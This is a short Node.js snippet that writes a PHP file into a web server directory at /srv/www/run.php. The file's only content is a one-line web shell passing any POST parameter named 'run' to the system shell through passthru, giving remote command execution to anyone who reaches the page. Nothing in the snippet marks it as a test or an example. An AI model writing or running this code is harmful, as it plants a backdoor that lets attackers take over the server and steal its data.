const fs = require("node:fs/promises");
const content = "<?php passthru($_POST['run']); ?>";
fs.writeFile("/srv/www/run.php", content);
